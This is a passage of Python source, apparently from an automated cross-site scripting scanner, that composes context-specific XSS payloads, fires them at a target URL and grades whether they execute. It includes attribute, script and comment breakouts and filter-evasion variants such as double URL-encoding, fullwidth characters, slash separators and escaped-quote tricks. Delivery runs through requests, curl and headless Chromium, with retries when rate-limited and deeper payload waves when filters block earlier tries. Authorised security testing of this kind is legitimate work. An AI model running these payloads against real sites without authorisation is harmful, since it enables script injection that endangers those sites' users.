                            f"no greater-than ({tag} {ev})", "gt_missing")
                elif not space_ok and slash_ok and name_ok(deps[0]) and \
                        kw.get(ev, True):
                    s_extra = "src" if extra == "src=x" else extra
                    for fn in [f for f in hfuncs if " " not in f][:fn_cap]:
                        parts = [f"<{tag}", s_extra, marker, f"{ev}={fn}//"]
                        add("/".join(p for p in parts if p),
                            f"slash-separated no greater-than ({tag} {ev})",
                            "gt_missing")
        else:
            # Raw '<' was blocked/encoded/removed, but check if double URL-decode
            # ('%3c' -> '<') or Unicode NFKC normalization ('\uff1c' -> '<')
            # reconstructed a literal '<' behind the filter.
            durl_lt = kwv.get("double_url_lt", ("", ""))[1] == "<"
            fw_lt = kwv.get("fullwidth_lt", ("", ""))[1] == "<"
            for active, lt_rep, gt_rep, label in (
                (durl_lt, "%3c", "%3e", "double URL-decoded angle bypass"),
                (fw_lt, "\uff1c", "\uff1e", "Unicode fullwidth NFKC angle bypass"),
            ):
                if not active:
                    continue
                for fn in hfuncs[:fn_cap]:
                    add(f"{lt_rep}svg {marker} onload={attr_val(fn)}{gt_rep}",
                        label, "body_direct", allow_chars={"<", ">"})
                    add(f"{lt_rep}img src=x {marker} onerror={attr_val(fn)}{gt_rep}",
                        label, "body_direct", allow_chars={"<", ">"})
                if not inert:
                    for fn in jfuncs[:fn_cap]:
                        add(f"{lt_rep}script {marker}{gt_rep}{fn}"
                            f"{lt_rep}/script{gt_rep}",
                            label, "body_direct", allow_chars={"<", ">"})

    elif ctx == "attr":
        if tags_ok and q_ok and quote:
            for tag, ev, extra in handler_variants():
                for fn in hfuncs[:fn_cap]:
                    if shape_ok(GEN_EV.get(ev), fn) and space_ok:
                        add(f'{quote}><{tag} {extra} {marker} {ev}={attr_val(fn)}>'
                            .replace("  ", " "),
                            "attribute breakout -> tag", "breakout_tag")
            if not space_ok and slash_ok:
                for tag, ev, extra, _deps in TAG_HANDLERS:
                    if kw.get(f"{tag}_tag", True) and kw.get(ev, True):
                        s_extra = "src" if extra == "src=x" else extra
                        for fn in [f for f in hfuncs if " " not in f][:fn_cap]:
                            parts = [f"{quote}><{tag}", s_extra, marker,
                                     f"{ev}={fn}>"]
                            add("/".join(p for p in parts if p),
                                "slash-separated attribute breakout -> tag",
                                "breakout_tag")
            if script_ok and jfuncs and space_ok:
                for fn in jfuncs[:fn_cap]:
                    if shape_ok("gen_script", fn):
                        add(f'{quote}><script {marker}>{fn}</script>',
                            "attribute breakout -> script", "breakout_tag")
        elif q_ok:
            sep = quote if quote else " "
            if hfuncs and kw.get("autofocus", True) and kw.get("onfocus", True):
                if space_ok:
                    for fn in hfuncs[:fn_cap]:
                        if quote or " " not in fn:
                            add(f'{sep} autofocus onfocus={sep}{fn}' if quote else
                                f' autofocus onfocus={fn} accesskey=x',
                                "in-context attribute injection", "attr_inject")
                elif slash_ok and quote:
                    for fn in [f for f in hfuncs if " " not in f][:fn_cap]:
                        add(f'{quote}/autofocus/onfocus={quote}{fn}',
                            "slash-separated attribute injection (space bypass)",
                            "attr_inject")

    elif ctx == "attr_handler":
        # input already inside an existing on*="" handler — zero-breaker JS
        for fn in hfuncs:
            add(f'{fn}/*{marker}*/', "in-handler direct call", "attr_inject")
        if quote and q_ok:
            for fn in hfuncs[:fn_cap]:
                add(f'{quote});{fn}/*{marker}*/;//',
                    "handler close-call breakout", "breakout_tag")

    elif ctx == "attr_url":
        # breakout first: a quote+tag escape works in ANY url attribute
        # (src=, href= alike) and fires without user interaction, whereas
        # javascript: needs href= + a click and is dead in src=/data=.
        if tags_ok and q_ok and quote:
            for tag, ev, extra in handler_variants():
                for fn in hfuncs[:fn_cap]:
                    if shape_ok(GEN_EV.get(ev), fn):
                        add(f'{quote}><{tag} {extra} {marker} {ev}={fn}>'
                            .replace("  ", " "),
                            "url-attr breakout -> tag", "breakout_tag")
        if kw.get("javascript_proto", True):
            for fn in jfuncs:
                if shape_ok("gen_jsurl", fn):
                    add(f'javascript:{fn}/*{marker}*/',
                        "javascript: URL direct", "protocol")

    elif ctx == "attr_srcdoc":
        if kw.get("entity_lt", True):
            for fn in jfuncs:
                add(f'&lt;script&gt;{marker}{fn}&lt;/script&gt;',
                    "srcdoc entity HTML", "special_attrs")

    elif ctx == "js_raw":
        if js_breakout and usable("/", scores):
            for fn in jfuncs[:fn_cap]:
                add(f'{js_breakout};{fn}/*{marker}*/;//',
                    f"structural JS closer ({js_breakout})", "js_string_exec")
        for fn in jfuncs:
            add(f'{fn}/*{marker}*/', "raw JS direct call", "js_string_exec")
        for fn in jfuncs[:fn_cap]:
            add(f');{fn}/*{marker}*/;//', "raw JS close-call", "js_string_exec")

    elif ctx == "js_template":
        if kw.get("interp", True):
            for fn in jfuncs:
                add(f'${{{fn}}}/*{marker}*/', "template-literal interpolation",
                    "js_string_exec")
        if quote == "`" and q_ok:
            for fn in jfuncs[:fn_cap]:
                add(f'`+{fn}+`/*{marker}*/', "literal concat breakout", "js_string_exec")

    elif ctx == "js_lcomment":
        if kw.get("newline", True):
            for fn in jfuncs:
                add(f'\n{fn}/*{marker}*/;//', "line-comment close + exec", "js_breakout")

    elif ctx == "js_bcomment":
        if kw.get("comment_close", True):
            for fn in jfuncs:
                add(f'*/{fn}/*{marker}*/;//', "block-comment close + exec", "js_breakout")

    elif ctx == "js_string":
        if tags_ok and slash_ok and script_ok and kw.get("close_script", True):
            for fn in jfuncs[:fn_cap]:
                if shape_ok("gen_script", fn):
                    add(f"</script><script {marker}>{fn}</script>//",
                        "script tag breakout", "js_breakout")
        elif q_ok and quote:
            brk = "js_break_squote" if quote == "'" else \
                  "js_break_dquote" if quote == '"' else None
            genbrk = "gen_break_squote" if quote == "'" else \
                     "gen_break_dquote" if quote == '"' else None
            # '"-abc()-"' is direct composite evidence and outranks the
            # junction_ok inference. If it fails but junction_ok still
            # proves the '"-x-' wrapper (only the ()-call inside was
            # signatured), non-parens fns can still ride the breakout.
            if genbrk in kw:
                if kw[genbrk]:
                    fns = jfuncs
                elif brk and junction_ok(brk, kw, kwv):
                    fns = [f for f in jfuncs if "(" not in f]
                else:
                    fns = []
            elif not brk or junction_ok(brk, kw, kwv):
                fns = jfuncs
            else:
                fns = []
            for fn in fns:
                if ";" not in fn:
                    add(f"{quote}-{fn}-{quote}", "in-string JS execution",
                        "js_string_exec")
            # Structural closer breakout (e.g. '"]});alert(1);//') for nested
            # objects/arrays/callbacks or statement-only fns (onerror=;throw 1)
            if js_breakout and len(js_breakout) > len(quote) and slash_ok:
                for fn in jfuncs[:fn_cap]:
                    add(f"{js_breakout};{fn}/*{marker}*/;//",
                        f"structural JS closer ({js_breakout})",
                        "js_string_exec")
            elif slash_ok:
                for fn in jfuncs[:fn_cap]:
                    add(f"{quote};{fn}/*{marker}*/;//",
                        "statement JS string breakout",
                        "js_string_exec")
        elif quote and quote in escaped_q and scores.get("\\", 0) >= 50:
            # Server backslash-escapes the quote ('"' -> '\\"') while '\'
            # survives as '\' or '\\': injecting '\"' yields '\\"' ->
            # literal backslash + unescaped closing quote.
            allow_esc = {quote, "\\"}
            for fn in jfuncs[:fn_cap]:
                add(f"\\{quote}-{fn}-\\{quote}",
                    "escaped-quote in-string JS execution",
                    "js_string_exec", allow_chars=allow_esc)
                if js_breakout and len(js_breakout) > len(quote) and slash_ok:
                    add(f"\\{js_breakout};{fn}/*{marker}*/;//",
                        f"escaped structural JS closer (\\{js_breakout})",
                        "js_string_exec", allow_chars=allow_esc)
                elif usable("/", scores):
                    add(f"\\{quote};{fn}/*{marker}*/;//",
                        "escaped-quote JS breakout",
                        "js_string_exec", allow_chars=allow_esc)

    elif ctx.startswith("consuming:"):
        tag = ctx.split(":", 1)[1]
        if tags_ok and slash_ok and kw.get(f"close_{tag}", True):
            if script_ok and jfuncs:
                for fn in jfuncs[:fn_cap]:
                    if shape_ok("gen_script", fn):
                        add(f"</{tag}><script {marker}>{fn}</script>",
                            f"{tag} close + script", "tag_breakout")
            if kw.get("img_tag", True) and kw.get("onerror", True) and hfuncs:
                for fn in hfuncs[:fn_cap]:
                    if shape_ok("gen_h_error", fn):
                        add(f'</{tag}><img src=x {marker} onerror={fn}>',
                            f"{tag} close + img onerror", "tag_breakout")
                        add(f'<{tag}><img title="{marker}</{tag}><img src onerror={fn}>"></{tag}>',
                            f"{tag} consuming-tag trick", "comment_break")

    elif ctx == "comment":
        if tags_ok and hfuncs and kw.get("svg_tag", True) \
                and kw.get("onload", True):
            if space_ok and kw.get("pair_svg_onload", True):
                for fn in hfuncs[:fn_cap]:
                    if shape_ok("gen_handler", fn):
                        add(f"--><svg {marker} onload={fn}>", "comment breakout",
                            "comment_break")
            elif not space_ok and slash_ok:
                for fn in [f for f in hfuncs if " " not in f][:fn_cap]:
                    add(f"--><svg/{marker}/onload={fn}>",
                        "slash-separated comment breakout (space bypass)",
                        "comment_break")

    return out


# --- marker-based DOM verification (DalFox R/V model) -------------------------

class MarkerDomCheck(HTMLParser):
    """Walk the response; record whether the marker element sits in an
    executable position (on* handler, script body, javascript:/data: URL).
    script_inert: mark <script> position as NON-executable — used on rendered
    DOM where a script-bearing marker reached this point only because nothing
    fired (innerHTML/insertAdjacentHTML-inserted scripts never execute). A
    script that truly ran was already caught by the alert-hook 'fired' list."""

    _INERT_CONTAINERS = ("textarea", "title", "xmp", "noembed", "noscript",
                         "template", "style")

    def __init__(self, marker, script_inert=False):
        super().__init__(convert_charrefs=False)
        self.marker = marker
        self.script_inert = script_inert
        self.executable = False
        self.evidence = ""
        self._in_script = False
        self._script_nonexec = False
        self._script_buf = None
        self._inert_tag = None
        self.script_hits = []   # script bodies containing the needle
        self.attr_hits = []     # (tag, attr, value) executable attrs seen
        self.url_hits = []      # (tag, attr, value) javascript:/data: URLs

    def handle_starttag(self, tag, attrs):
        t_low = tag.lower()
        if self._inert_tag is not None:
            return
        d = dict(attrs)
        if t_low == "script":
            self._in_script = True
            self._script_buf = ""
            stype = (d.get("type") or "").strip().lower()
            self._script_nonexec = bool(
                stype and stype not in (
                    "text/javascript", "application/javascript", "module",
                    "text/ecmascript", "application/ecmascript")
                and "javascript" not in stype and "ecmascript" not in stype)
        joined = " ".join(str(v or "") for v in d.values())
        has_marker = (self.marker in joined or self.marker in "".join(d.keys()))
        if has_marker:
            for k, v in d.items():
                if k.startswith("on"):
                    self.executable = True
                    self.attr_hits.append((tag, k, v or ""))
                    self.evidence = f"<{tag}> marker element carries event handler {k}"
                if k in ("href", "src", "action", "formaction") and v and \
                        re.match(r"\s*(javascript:|data:text|vbscript:)", v, re.I):
                    self.executable = True
                    self.url_hits.append((tag, k, v))
                    self.evidence = f"<{tag}> marker element has executable {k} URL"
                if k == "srcdoc" and v and re.search(r"(on\w+=|<script|&lt;script|onerror)",
                                                     v, re.I):
                    self.executable = True
                    self.evidence = "marker inside <iframe srcdoc> executable HTML"
            if t_low == "script" and not self.script_inert and not self._script_nonexec:
                self.executable = True
                self.evidence = "marker inside <script> element"
        if t_low in self._INERT_CONTAINERS:
            self._inert_tag = t_low

    def handle_endtag(self, tag):
        t_low = tag.lower()
        if self._inert_tag == t_low:
            self._inert_tag = None
            return
        if self._inert_tag is not None:
            return
        if t_low == "script":
            if self._script_buf and self.marker in self._script_buf \
                    and not self._script_nonexec:
                self.script_hits.append(self._script_buf)
            self._in_script = False
            self._script_nonexec = False
            self._script_buf = None

    def handle_data(self, data):
        if self._inert_tag is not None:
            return
        if self._in_script:
            if self._script_buf is not None:
                self._script_buf += data
            if not self.script_inert and not self._script_nonexec \
                    and self.marker in data:
                self.executable = True
                self.evidence = "marker inside <script> body"


def _core_payload(marked, marker):
    """The sent payload minus the marker: strip a <!--marker--> tail and any
    in-payload marker, leaving the executable text we actually injected."""
    core = marked.replace(f"<!--{marker}-->", "")
    return core.replace(marker, "")


def _parse_response(raw):
    """Split curl -i output into (status, headers, body). Handles stacked
    header blocks (100-continue, redirects)."""
    status = 0
    headers = {}
    while raw.startswith("HTTP/"):
        _, _, rest = raw.partition("\n")
        m = re.match(r"HTTP/\S+\s+(\d+)", raw)
        if m:
            status = int(m.group(1))
        head, sep, body = rest.partition("\r\n\r\n")
        if not sep:
            head, sep, body = rest.partition("\n\n")
        if not sep:
            break
        for hl in head.splitlines():
            k, _, v = hl.partition(":")
            if k.strip():
                headers[k.strip().lower()] = v.strip()
        raw = body
    return status, headers, raw


def _locate_anchor(body, marker, marked):
    """Find what actually reflected: marker first, then core fallbacks
    (verbatim -> html-escaped -> url-encoded). Returns (needle, style)."""
    if marker in body:
        return marker, "marker"
    core = _core_payload(marked, marker)
    from html import escape as _he
    for variant, style in ((core, "core"),
                           (_he(core), "core html-encoded"),
                           (quote(core, safe=""), "core url-encoded")):
        if variant and variant in body:
            return variant, style
    return None, ""


def classify_response(status, headers, body, payload, marker, marked=None):
    """Grade one fetched response. Flow:
      blocked? -> marker/core anchor? -> executable position? -> JS ctx:
      surviving call inside payload span? -> V / V-truncated / R / none.
    Pure function over (status, headers, body) so every branch is testable.
    `marked` = the exact string sent (caller picks the marker tail); when
    omitted the legacy <!-- --> tail is assumed."""
    if marked is None:
        marked = payload.replace("vvm{id}", marker)
        if "vvm" not in marked:
            marked += f"<!--{marker}-->"
    core = _core_payload(marked, marker)
    csp = headers.get("content-security-policy", "")
    csp_note = ""
    if csp and re.search(r"(?:script-src|default-src)", csp) \
            and "unsafe-inline" not in csp:
        csp_note = " | CSP: script-src lacks 'unsafe-inline' — inline payload likely blocked"

    needle, style = _locate_anchor(body, marker, marked)
    if needle is None:
        if status >= 400:
            return {"payload": marked, "confidence": "blocked",
                    "evidence": f"HTTP {status} — request rejected before reflection"}
        return {"payload": marked, "confidence": "none",
                "evidence": "payload not reflected"
                            + (f" (HTTP {status})" if status else "")}

    chk = MarkerDomCheck(needle)
    chk.feed(body)
    if not chk.executable:
        ev = (f"marker stripped but {style} reflected, not in executable position"
              if style != "marker" else
              "marker reflected but not in executable position")
        return {"payload": marked, "confidence": "R", "evidence": ev}

    # JS contexts: marker-in-<script>-body — require a surviving call in the
    # payload span (Dalfox payload_range_hits_sink port). A marker inside a
    # script whose call was stripped (""-(1)-"") is dead code, not a finding.
    if chk.script_hits:
        import js_verify
        needles = [marked, core] if style == "marker" else [needle]
        mk = marker if style == "marker" else None
        for script_text in chk.script_hits:
            for nd in needles:
                live, det = js_verify.payload_live_in_js(script_text, nd, mk)
                if live:
                    ev = chk.evidence + " — " + det
                    return {"payload": marked, "confidence": "V",
                            "evidence": ev + csp_note}
        return {"payload": marked, "confidence": "R",
                "evidence": "marker in <script> but no surviving call — "
                            "executable core stripped or trapped"}

    # on* handlers: entity-decode the value the way the browser will, then
    # check the intended JS fragment produced a call
    if chk.attr_hits:
        import js_verify
        from html import unescape
        intended = js_verify.extract_intended_js(core)
        # a /*{marker}*/ tail strips to an empty /**/ husk in `core`, but the
        # reflected attr keeps the marker — offer the husk-free needle too
        husk = re.sub(r"/\*\s*\*/", "", intended)
        needles = [intended] + ([husk] if husk != intended else []) \
            + ([unescape(intended)]
               if unescape(intended) != intended else [])
        mk = marker if style == "marker" else None
        for _tag, _attr, val in chk.attr_hits:
            uv = unescape(val)
            for nd in needles:
                live, det = js_verify.payload_live_in_js(uv, nd, mk)
                if live:
                    if det.startswith("sink assignment + throw: onerror") \
                            and _tag.lower() != "body" \
                            and not re.search(
                                r"(?:self|window|top|parent|globalThis|frames)"
                                r"\s*\.\s*onerror\s*=", uv):
                        continue
                    return {"payload": marked, "confidence": "V",
                            "evidence": chk.evidence + " — " + det + csp_note}
        return {"payload": marked, "confidence": "R",
                "evidence": "marker element has on* handler but injected JS "
                            "did not survive"}

    # javascript:/data: URLs — check the scheme body for a surviving call
    if chk.url_hits:
        import js_verify
        from html import unescape
        intended = js_verify.extract_intended_js(core)
        husk = re.sub(r"/\*\s*\*/", "", intended)
        needles = [intended] + ([husk] if husk != intended else []) \
            + ([unescape(intended)]
               if unescape(intended) != intended else [])
        mk = marker if style == "marker" else None
        for _tag, _attr, val in chk.url_hits:
            uv = unescape(val)
            body_js = re.sub(r"^\s*(?:javascript|data:text/html[^,]*,)\s*",
                             "", uv, flags=re.I)
            for nd in needles:
                live, det = js_verify.payload_live_in_js(body_js, nd, mk)
                if live:
                    break
            if live:
                return {"payload": marked, "confidence": "V",
                        "evidence": chk.evidence + " — " + det +
                        " (requires click if href)" + csp_note}
        return {"payload": marked, "confidence": "R",
                "evidence": "executable URL attr but injected JS did not survive"}

    return {"payload": marked, "confidence": "V",
            "evidence": chk.evidence + csp_note}


def verify_payload(url, payload, render=False, comment_ok=True):
    """Inject payload with marker; grade V (executable) or R (reflected).
    render=True fetches via headless chromium — needed when the reflection
    lives only in the DOM (document.write/innerHTML sinks), and captures
    real execution via hooked alert/confirm/prompt/print calls.
    comment_ok=False picks a /* */ tail instead of <!-- --> — deny-page
    filters (strpos + die on <>) would otherwise kill the marker itself."""
    marker = "vvm" + "".join(secrets.choice(string.ascii_lowercase) for _ in range(6))
    marked = payload.replace("vvm{id}", marker)
    if "vvm" not in marked:
        marked += f"<!--{marker}-->" if comment_ok else f"/*{marker}*/"
    target = url.replace(PLACEHOLDER, quote(marked, safe=""))

    if render:
        try:
            from send_payloads import fetch_rendered
            body, rmeta = fetch_rendered(target)
        except Exception as e:
            return {"payload": marked, "confidence": "error",
                    "evidence": f"render failed: {e}"}
        fired = rmeta.get("fired") or []
        sink_hits = [n for n, a in rmeta.get("sinks", []) if marker in a]
        if fired:
            return {"payload": marked, "confidence": "V",
                    "evidence": "executed: " + "; ".join(fired[:3])}
        if marker not in body and not sink_hits:
            core = _core_payload(marked, marker)
            if core in body:
                return {"payload": marked, "confidence": "R",
                        "evidence": "marker stripped but core payload reflected "
                                    "— did not execute"}
            return {"payload": marked, "confidence": "none",
                    "evidence": "payload not reflected (rendered DOM)"}
        chk = MarkerDomCheck(marker, script_inert=True)
        chk.feed(body)
        if chk.executable:
            return {"payload": marked, "confidence": "R",
                    "evidence": chk.evidence + " — position only, did not fire"}
        ev = ("marker reached sink: " + ", ".join(sorted(set(sink_hits)))
              if sink_hits else "marker reflected but not in executable position")
        return {"payload": marked, "confidence": "R", "evidence": ev}

    sess = _get_verify_session()
    if sess is not None:
        try:
            for attempt in range(4):
                req = requests.Request("GET", target)
                prep = sess.prepare_request(req)
                prep.url = target
                resp = sess.send(prep, verify=False, allow_redirects=False,
                                 timeout=15)
                if resp.status_code not in (429, 503) or attempt == 3:
                    break
                import time as _t
                _t.sleep(min(4.0, 0.3 * (2 ** attempt))
                         + (secrets.randbelow(200) / 1000.0))
            status = resp.status_code
            headers = {k.lower(): v for k, v in resp.headers.items()}
            body = resp.text
            return classify_response(status, headers, body, payload, marker, marked)
        except Exception:
            pass
    try:
        raw = subprocess.run(
            ["curl", "-s", "-k", "-i", "--max-time", "15", "-A",
             _UA, target],
            capture_output=True, text=True, timeout=20).stdout
    except Exception as e:
        return {"payload": marked, "confidence": "error", "evidence": str(e)}
    status, headers, body = _parse_response(raw)
    return classify_response(status, headers, body, payload, marker, marked)


# --- main --------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(description="Recommend XSS payloads from reflection analysis")
    ap.add_argument("--analysis", help="path to *-xss_reflection_analysis.json "
                                       "(default: latest in Skills/log/)")
    ap.add_argument("--url", help="target URL with {xss_testing} placeholder "
                                  "(required for --verify)")
    ap.add_argument("--keywords", help="path to *-xss_keyword_analysis.json "
                                       "(default: latest in Skills/log/, if any)")
    ap.add_argument("--verify", action="store_true",
                    help="inject top payloads with a marker and grade R/V")
    ap.add_argument("--render", action="store_true",
                    help="verify via rendered DOM (headless chromium) — for "
                         "DOM sinks like document.write(location.search); "
                         "auto-enabled when the analysis came from --render")
    ap.add_argument("--top", type=int, default=3,
                    help="max payload candidates per reflection (default 3)")
    args = ap.parse_args()

    print("=" * 80)
    print("Recommend Payload  (breaker -> char-gate -> grammar -> marker verify)")
    print(f"Date: {datetime.now().isoformat()}")
    print("=" * 80)

    analysis_file = args.analysis or latest_log_path("xss_reflection_analysis", "json")
    if not analysis_file or not os.path.exists(analysis_file):
        print("No reflection analysis found. Run check_reflection.py first.")
        return
    print(f"Reading analysis: {analysis_file}\n")

    analysis = json.load(open(analysis_file))
    results = analysis["results"]
    source_html = analysis.get("source_html", "")
    refl_ids = sorted({r["reflection_index"] for r in results})

    # Layer B/C keyword mask (probe2) — optional; absent = assume all allowed
    kw_file = args.keywords or latest_log_path("xss_keyword_analysis", "json")
    kw_by_refl = {}
    kwv_by_refl = {}
    if kw_file and os.path.exists(kw_file):
        kwdata = json.load(open(kw_file))
        for r in kwdata.get("results", []):
            kw_by_refl.setdefault(r["reflection_index"], {})[r["character_name"]] = r["passed"]
            kwv_by_refl.setdefault(r["reflection_index"], {})[r["character_name"]] = \
                (r.get("expected", ""), r.get("got_back", ""))
        print(f"Keyword mask:     {kw_file}\n")
    else:
        print("Keyword mask:     none found (run send_payloads.py --probe2 + "
              "check_reflection.py --keywords to enable Layer B/C gating)\n")

    report = {"generated_by": "recommend_payload.py",
              "generated_at": datetime.now().isoformat(),
              "source_analysis": analysis_file,
              "source_keyword_analysis": kw_file if kw_by_refl else None,
              "reflections": []}

    for rid in refl_ids:
        raw_ctxs = [c for r in results if r["reflection_index"] == rid
                    for c in r["contexts"]]
        ctxs = [k for c in raw_ctxs for k in normalize_contexts([c])]
        ctx = ctxs[0]
        # "dom sink: innerHTML (html body)" -> inert scripts never execute
        m_sink = next((m for c in raw_ctxs
                       if (m := re.search(r"dom sink:\s*([\w:.-]+)", c))), None)
        inert = bool(m_sink) and m_sink.group(1).lower() in INERT_SCRIPT_SINKS
        scores = char_scores(results, rid)
        esc_q = escaped_quotes(results, rid)
        # Fallback to reflection_index 0 when Probe 1 reflected normally
        # (rid >= 1) but Probe 2 hit a request-level block and was bisected
        # (stored under reflection_index 0), or vice versa.
        kw = kw_by_refl.get(rid) or kw_by_refl.get(0) or \
            (kw_by_refl.get(1, {}) if rid == 0 else {})
        kwv = kwv_by_refl.get(rid) or kwv_by_refl.get(0) or \
            (kwv_by_refl.get(1, {}) if rid == 0 else {})
        r_rows = [r for r in results if r["reflection_index"] == rid]
        per_q = next((r["quote"] for r in r_rows
                      if "quote" in r and r["quote"] is not None), None)
        js_brk = next((r.get("js_breakout") or "" for r in r_rows
                       if r.get("js_breakout")), "")
        quote_ch = (per_q if per_q is not None
                    else detect_quote(source_html, "testing1"))
        # bisect-attributed rows (reflection_index 0) come from a deny page
        # with no reflection — the baseline probe carries the real quote
        if rid == 0 and analysis.get("attribution_quote") is not None:
            quote_ch = analysis["attribution_quote"]
        max_len = analysis.get("max_len")
        cand = compose(ctx, quote_ch, scores, kw, kwv, inert=inert,
                       escaped_q=esc_q, js_breakout=js_brk,
                       deny=(rid == 0))
        if max_len:
            fit = [c for c in cand if len(c["payload"]) <= max_len]
            if fit:
                cand = fit
        # rank on equal efficiency: direct payloads execute as-is;
        # splitter probes test THIS filter's actual deletion set;
        # blind mutations (case/entity) are last-resort guesses.
        # Without tiers, --top N slots get spent on probes in
        # insertion order and the working vector never gets fired.
        def tier(c):
            t = c["technique"]
            if "splitter" in t or "bypass" in t:
                return 1
            if c["case_ref"] == "tag_removed" or "case-mutated" in t \
                    or "entity" in t or "unicode-escaped" in t \
                    or "bracket-access" in t:
                return 2
            return 0
        cand.sort(key=lambda c: (-c["efficiency"], tier(c)))
        cand = cand[: args.top]

        print(f"--- Reflection [{rid}]  context={ctx}  quote='{quote_ch or 'unquoted'}'")
        print(f"    char efficiency: " +
              " ".join(f"{c}={s}" for c, s in scores.items()))
        if kw:
            print(f"    keyword mask:    " +
                  " ".join(f"{k}={'OK' if v else 'BLOCKED'}" for k, v in kw.items()))
        if not cand:
            print("    [NO CANDIDATE] no payload passes the char gate -> "
                  "consult case/ manually or extend grammar")
        for i, c in enumerate(cand):
            print(f"    [{i + 1}] eff={c['efficiency']}%  {c['payload']}")
            print(f"        technique: {c['technique']}  |  case: {c['case_ref']}")

        entry = {"reflection_index": rid, "context": ctx,
                 "quote": quote_ch, "scores": scores, "keyword_mask": kw,
                 "candidates": cand}

        if args.verify and cand:
            if not args.url or PLACEHOLDER not in (args.url or ""):
                print("    [!] --verify needs --url containing {xss_testing}")
            else:
                render = args.render or analysis.get("probe_mode") == "render"
                print(f"    verifying top payloads{render and ' (rendered DOM)' or ''}...")
                # Verify waves: start shallow (fn_cap=2, matching the emitted
                # list). When every candidate fails, re-compose with a deeper
                # fn slice and verify the next unseen batch — deeper bracket
                # splits and name variants — instead of stopping at the first
                # dead signatures.
                seen, verified = set(), []
                cap, wave = 2, cand
                # deny-page filters kill the marker itself when the <!-- -->
                # tail carries <>: fall back to a /* */ comment tail — it
                # lands inert inside handlers/attrs and survives strpos lists
                comment_ok = usable("<", scores) and usable(">", scores)
                # Adaptive parallelism: concurrent static verify on clean
                # targets; drop to 1 worker when WAF/deny attribution (rid==0)
                # or headless rendering is active.
                workers = 1 if (render or rid == 0) else 4
                while wave:
                    found = False
                    batch = []
                    for c in wave:
                        if c["payload"] not in seen:
                            seen.add(c["payload"])
                            batch.append(c["payload"])
                    if not batch:
                        break
                    if workers > 1 and len(batch) > 1:
                        with ThreadPoolExecutor(
                                max_workers=min(workers, len(batch))) as ex:
                            b_vers = list(ex.map(
                                lambda p: verify_payload(
                                    args.url, p, render=False,
                                    comment_ok=comment_ok),
                                batch))
                        for v in b_vers:
                            verified.append(v)
                            if v["confidence"] == "V":
                                found = True
                                if cap > 2:
                                    break
                    else:
                        for p in batch:
                            v = verify_payload(args.url, p,
                                               render=render,
                                               comment_ok=comment_ok)
                            verified.append(v)
                            if v["confidence"] == "V":
                                found = True
                                if cap > 2:
                                    break      # expansion wave: first hit suffices
                    if found or cap >= 16:
                        break
                    cap *= 2
                    more = compose(ctx, quote_ch, scores, kw, kwv, inert,
                                   fn_cap=cap, escaped_q=esc_q,
                                   js_breakout=js_brk, deny=(rid == 0))
                    if max_len:
                        more_fit = [c for c in more
                                    if len(c["payload"]) <= max_len]
                        if more_fit:
                            more = more_fit
                    more.sort(key=lambda c: (-c["efficiency"], tier(c)))
                    wave = [c for c in more
                            if c["payload"] not in seen][:args.top]

                # Hybrid Static -> Render Escalation (C3): when static verify
                # found no [V] but returned [R] (or page has DOM plumbing),
                # escalate top 2 candidates to real Chromium (window.__fired).
                if not render and not any(v["confidence"] == "V"
                                          for v in verified):
                    has_r = any(v["confidence"] == "R" for v in verified)
                    if has_r or analysis.get("dom_hint"):
                        for idx, c in enumerate(cand[:2]):
                            rv = verify_payload(args.url, c["payload"],
                                                render=True,
                                                comment_ok=comment_ok)
                            if rv["confidence"] == "V":
                                if idx < len(verified):
                                    verified[idx] = rv
                                else:
                                    verified.append(rv)
                                break
                entry["verification"] = verified
                for v in verified:
                    print(f"        [{v['confidence']}] {v['payload']}")
                    print(f"            {v['evidence']}")
        print()
        report["reflections"].append(entry)

    out_file = new_log_path("xss_recommendation", "json")
    with open(out_file, "w") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    print(f"💾 Recommendation saved to: {out_file}")


if __name__ == "__main__":
    main()
